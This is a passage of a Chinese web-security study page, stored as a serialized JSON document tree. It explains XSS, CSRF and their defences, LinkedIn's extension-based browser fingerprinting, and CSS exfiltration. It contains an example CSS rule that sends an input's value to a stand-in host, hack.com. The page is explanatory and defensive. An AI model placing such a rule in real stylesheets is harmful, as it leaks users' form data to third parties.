等常见攻击手段的原理分析和防范措施。",{"type":182,"children":183,"toc":413},"root",[184,192,207,212,219,225,231,236,242,247,253,258,263,269,282,299,304,310,407],{"type":185,"tag":186,"props":187,"children":189},"element","h2",{"id":188},"领域",[190],{"type":191,"value":188},"text",{"type":185,"tag":193,"props":194,"children":195},"ul",{},[196],{"type":185,"tag":197,"props":198,"children":199},"li",{},[200],{"type":185,"tag":201,"props":202,"children":204},"a",{"href":203},"/maps/_web/browser-api/crypto",[205],{"type":191,"value":206},"Web Crypto API",{"type":185,"tag":186,"props":208,"children":210},{"id":209},"概念",[211],{"type":191,"value":209},{"type":185,"tag":213,"props":214,"children":216},"h4",{"id":215},"xss-的原理是怎么样的",[217],{"type":191,"value":218},"XSS 的原理是怎么样的？",{"type":185,"tag":220,"props":221,"children":222},"p",{},[223],{"type":191,"value":224},"XSS（Cross Site Scripting）跨站脚本攻击，通过某种方式将非法代码挂载在 URL、或者后端数据中，以达到让浏览器执行的目的。反射型 XSS 和储存型 XSS 都是利用后端返回的非法脚本直接在前端展示，就得到了执行。DOM-Based XSS 是通过修改源码内容来执行的。比如说，反射型 XSS 可能是一封黑客的邮件，链接参数带上了脚本代码；储存型 XSS 在可视化编辑器中很常见；DOM-Based XSS 可能是执行了一段 URL Hash 里面拿到的文本。",{"type":185,"tag":213,"props":226,"children":228},{"id":227},"xss-有哪些危害怎么防范",[229],{"type":191,"value":230},"XSS 有哪些危害，怎么防范？",{"type":185,"tag":220,"props":232,"children":233},{},[234],{"type":191,"value":235},"XSS 可以用来盗取 Cookie、DDos、篡改数据等。防范最基本要做的就是是后端不应该信任前端传来的数据，并且要做好过滤，把字符转义为 HTML 实体。其次是给 Cookie 设上 http-only。",{"type":185,"tag":213,"props":237,"children":239},{"id":238},"csrf-攻击原理是怎么样的",[240],{"type":191,"value":241},"CSRF 攻击原理是怎么样的？",{"type":185,"tag":220,"props":243,"children":244},{},[245],{"type":191,"value":246},"CSRF（Cross Site Request Forgery）跨站请求伪造，主要原理是黑客利用了用户在敏感站点保持的登录态，在另一个用户访问的网页去伪造敏感站点的请求。",{"type":185,"tag":213,"props":248,"children":250},{"id":249},"csrf-怎么防范",[251],{"type":191,"value":252},"CSRF 怎么防范？",{"type":185,"tag":220,"props":254,"children":255},{},[256],{"type":191,"value":257},"可以使用 CSRF token 方案。每次用户请求 HTML 都在其中设置一个随机的 Token，在请求时带上。",{"type":185,"tag":186,"props":259,"children":261},{"id":260},"用户追踪技术",[262],{"type":191,"value":260},{"type":185,"tag":213,"props":264,"children":266},{"id":265},"linkedin-如何使用浏览器指纹追踪用户",[267],{"type":191,"value":268},"LinkedIn 如何使用浏览器指纹追踪用户？",{"type":185,"tag":220,"props":270,"children":271},{},[272,274,280],{"type":191,"value":273},"LinkedIn 被披露使用激进的\"用户指纹\"技术追踪用户：页面会加载一个包含 ",{"type":185,"tag":275,"props":276,"children":277},"strong",{},[278],{"type":191,"value":279},"2953 个浏览器插件",{"type":191,"value":281},"的清单，脚本依次检测用户安装了其中哪些插件，以此生成唯一特征码识别用户。这导致访问 LinkedIn 时控制台可能出现上千个报错。这种追踪方式比传统的 cookie 更隐蔽、更难防范，代表了当前网站用户追踪技术的极端案例。",{"type":185,"tag":283,"props":284,"children":285},"blockquote",{},[286],{"type":185,"tag":220,"props":287,"children":288},{},[289,291],{"type":191,"value":290},"#周刊摘录 见：",{"type":185,"tag":201,"props":292,"children":296},{"href":293,"rel":294},"https://www.ruanyifeng.com/blog/2026/02/weekly-issue-385.html",[295],"nofollow",[297],{"type":191,"value":298},"科技周刊第385期",{"type":185,"tag":186,"props":300,"children":302},{"id":301},"三剑客",[303],{"type":191,"value":301},{"type":185,"tag":213,"props":305,"children":307},{"id":306},"css-exfiltration-攻击原理是什么",[308],{"type":191,"value":309},"CSS Exfiltration 攻击原理是什么？",{"type":185,"tag":311,"props":312,"children":316},"pre",{"className":313,"code":314,"language":315,"meta":178,"style":178},"language-css shiki shiki-themes material-theme-lighter github-light github-dark monokai","input[value^=a]{\n  background-image: url(http://hack.com/a);\n}\n","css",[317],{"type":185,"tag":318,"props":319,"children":320},"code",{"__ignoreMap":178},[321,361,398],{"type":185,"tag":322,"props":323,"children":326},"span",{"class":324,"line":325},"line",1,[327,333,339,345,351,356],{"type":185,"tag":322,"props":328,"children":330},{"style":329},"--shiki-light:#E2931D;--shiki-default:#22863A;--shiki-dark:#85E89D;--shiki-sepia:#F92672",[331],{"type":191,"value":332},"input",{"type":185,"tag":322,"props":334,"children":336},{"style":335},"--shiki-light:#39ADB5;--shiki-d